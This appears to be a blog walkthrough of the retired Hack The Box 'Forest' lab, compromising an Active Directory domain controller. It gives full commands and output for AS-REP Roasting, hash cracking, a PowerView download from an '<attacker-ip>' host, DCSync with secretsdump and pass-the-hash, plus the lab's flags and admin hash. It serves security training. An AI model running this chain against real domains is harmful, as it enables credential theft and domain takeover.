+++
title = "HTB — Forest"
date = "2026-05-05T00:00:00-05:00"
tags = ["htb", "windows", "active-directory", "ldap", "kerberos", "as-rep-roasting", "bloodhound", "dcsync", "winrm", "retired"]
description = "Walkthrough of Hack The Box Forest — LDAP and RPC enumeration against an Active Directory DC, AS-REP Roasting a service account with pre-auth disabled, then abusing Exchange Windows Permissions to grant DCSync rights and dump all domain hashes."
draft = false
+++

## Machine Info

| Field       | Value                                          |
|-------------|------------------------------------------------|
| Name        | Forest                                         |
| Platform    | Hack The Box                                   |
| Difficulty  | Medium                                         |
| OS          | Windows Server 2016 (Active Directory)         |
| Release     | 2019                                           |
| Tags        | Active Directory, LDAP, AS-REP Roasting, BloodHound, DCSync, Exchange |

Forest is a Medium Windows box and one of the best AD-focused machines on the platform. It introduces a clean chain of real-world techniques: unauthenticated LDAP and RPC enumeration to build a user list, AS-REP Roasting a service account that has Kerberos pre-authentication disabled, then using BloodHound to identify a privilege escalation path through Exchange Windows Permissions to grant DCSync rights and dump the domain.

---

## 1. Initial Enumeration (nmap)

```bash
nmap -sC -sV -p- -oA nmap/forest -vvv 10.10.10.161
```

Relevant output:

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows AD LDAP (Domain: htb.local)
445/tcp  open  microsoft-ds  Windows Server 2016 Standard
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows AD LDAP
5985/tcp open  http          Microsoft HTTPAPI (WinRM)
9389/tcp open  mc-nmf        .NET Message Framing
```

The port profile — DNS (53), Kerberos (88), LDAP (389/636/3268), RPC (135/593), SMB (445), and WinRM (5985) — is a domain controller. The LDAP banner confirms the domain: `htb.local`.

---

## 2. LDAP Enumeration — Naming Contexts

Query the LDAP base object to confirm the domain structure:

```bash
ldapsearch -x -h 10.10.10.161 -s base namingcontexts
```

```
namingContexts: DC=htb,DC=local
namingContexts: CN=Configuration,DC=htb,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
namingContexts: DC=DomainDnsZones,DC=htb,DC=local
namingContexts: DC=ForestDnsZones,DC=htb,DC=local
```

Domain confirmed as `htb.local`. Anonymous LDAP bind is allowed — no credentials needed for basic enumeration.

---

## 3. RPC Enumeration — User List

Use `rpcclient` with a null session to enumerate domain users:

```bash
rpcclient -U '' -N 10.10.10.161
rpcclient $> enumdomusers
```

```
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

The `SM_*` and `HealthMailbox*` accounts are Exchange service accounts — ignore them. The interesting accounts are the human users and the service account `svc-alfresco`.

Build a clean user list:

```
sebastien
lucinda
svc-alfresco
andy
mark
santi
```

---

## 4. AS-REP Roasting — Capturing the Hash

AS-REP Roasting targets accounts that have Kerberos pre-authentication disabled (`UF_DONT_REQUIRE_PREAUTH`). When pre-auth is off, the KDC will return an AS-REP encrypted with the account's password hash without verifying the requestor's identity first — meaning anyone can request it and attempt to crack it offline.

```bash
impacket-GetNPUsers -usersfile users.lst -dc-ip 10.10.10.161 htb.local/
```

```
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:acef1b61...
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
```

`svc-alfresco` has pre-auth disabled. The AS-REP hash is returned.

---

## 5. Cracking the Hash

```bash
john hash.txt -w=/usr/share/wordlists/rockyou.txt
```

```
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
```

Credentials: `svc-alfresco : s3rvice`

---

## 6. Initial Shell (WinRM)

Port 5985 is open — WinRM is available. Connect with evil-winrm:

```bash
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
```

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
htb\svc-alfresco
```

---

## 7. User Flag

```powershell
type C:\Users\svc-alfresco\Desktop\user.txt
```

```
e5e4e47ae7022664cda6eb013fb0d9ed
```

---

## 8. Privilege Escalation — BloodHound

Collect AD data with SharpHound and import into BloodHound. The key finding is a path from `svc-alfresco` to Domain Admin:

```
svc-alfresco
  -> member of: Account Operators
      -> Account Operators can add members to Exchange Windows Permissions
          -> Exchange Windows Permissions has WriteDACL on the domain object (DC=htb,DC=local)
              -> WriteDACL allows granting DCSync rights to any principal
```

**Account Operators** is a built-in privileged group that can create users and add them to most non-protected groups — including **Exchange Windows Permissions**. That group holds a `WriteDACL` ACE on the root domain object, which means its members can modify the domain's access control list and grant themselves replication rights (DCSync).

---

## 9. Exploiting the Path — DCSync

**Step 1** — Create a new user and add them to Exchange Windows Permissions:

```powershell
net user attacker Sup3rS3cr3t! /add /domain
net group "Exchange Windows Permissions" /add attacker
```

**Step 2** — Download PowerView and grant DCSync rights to the new user:

```powershell
IWR http://<attacker-ip>/PowerView.ps1 -OutFile PowerView.ps1
. .\PowerView.ps1

$pass = ConvertTo-SecureString 'Sup3rS3cr3t!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb\attacker', $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity attacker -Rights DCSync
```

**Step 3** — Run secretsdump to perform the DCSync and dump all hashes:

```bash
impacket-secretsdump htb.local/attacker:Sup3rS3cr3t!@10.10.10.161
```

```
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
```

---

## 10. Root Flag

Pass the Administrator NTLM hash directly with evil-winrm — no need to crack it:

```bash
evil-winrm -i 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
f0476e5f886f93e0ae23b1aaade08b65
```

---

## Summary of Flags

| Flag     | Path                                    | Value                              |
|----------|-----------------------------------------|------------------------------------|
| user.txt | `C:\Users\svc-alfresco\Desktop\user.txt`| `e5e4e47ae7022664cda6eb013fb0d9ed` |
| root.txt | `C:\Users\Administrator\Desktop\root.txt`| `f0476e5f886f93e0ae23b1aaade08b65`|

---

## Full Attack Chain

```
nmap
  -> DC port profile (53, 88, 389, 445, 5985) + domain: htb.local
      -> ldapsearch (anonymous) -> naming contexts confirmed
          -> rpcclient null session -> enumdomusers -> user list
              -> impacket-GetNPUsers -> svc-alfresco has no pre-auth
                  -> AS-REP hash captured
                      -> john -> s3rvice
                          -> evil-winrm -> shell as svc-alfresco
                              -> user.txt
                              -> BloodHound
                                  -> svc-alfresco in Account Operators
                                      -> Account Operators -> Exchange Windows Permissions
                                          -> Exchange Windows Permissions -> WriteDACL on domain
                                              -> net user + net group -> new user in ExchWinPerms
                                                  -> PowerView Add-DomainObjectAcl -> DCSync rights
                                                      -> impacket-secretsdump -> admin NTLM hash
                                                          -> evil-winrm PTH -> root
                                                              -> root.txt
```

---

## Key Takeaways

- **AS-REP Roasting requires no credentials.** Any service account with `UF_DONT_REQUIRE_PREAUTH` set leaks an offline-crackable hash to anonymous requestors. Service accounts are frequent targets because they often have this flag set and use weak or static passwords.
- **BloodHound finds non-obvious paths.** The `Account Operators → Exchange Windows Permissions → WriteDACL` chain is not something you would discover manually in a reasonable amount of time. Collecting and graphing AD relationships is essential for any AD engagement.
- **WriteDACL on a domain object is effectively DA.** The ability to modify a domain object's DACL means you can grant yourself any right on the domain, including DCSync (DS-Replication-Get-Changes-All), which lets you impersonate a domain controller and pull every hash in the directory.
- **Pass-the-hash with evil-winrm skips cracking entirely.** Once you have an NTLM hash for an account with WinRM access, `-H` gives you an interactive shell without needing the plaintext password.
